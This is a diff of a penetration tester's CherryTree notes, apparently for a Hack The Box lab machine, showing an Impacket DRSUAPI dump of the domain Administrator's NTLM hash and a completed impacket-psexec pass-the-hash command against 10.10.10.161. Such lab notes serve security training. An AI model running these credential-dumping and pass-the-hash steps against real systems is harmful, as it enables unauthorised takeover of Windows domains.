@@ -11273,7 +11273,7 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 </codebox>
       </node>
-      <node name="PrivEsc" unique_id="104" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696627148" ts_lastsave="1696735442">
+      <node name="PrivEsc" unique_id="104" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696627148" ts_lastsave="1696735451">
         <rich_text>
 since we have credentials we will run the followig:
 
@@ -11337,7 +11337,7 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 [*] Using the DRSUAPI method to get NTDS.DIT secrets
 htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
 </codebox>
-        <codebox char_offset="335" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec  d.local/admin@10.10.10.161 -hashes </codebox>
+        <codebox char_offset="335" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec  htb.local/admin@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 </codebox>
       </node>
     </node>
     <node name="Exploitation" unique_id="22" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1500474629">
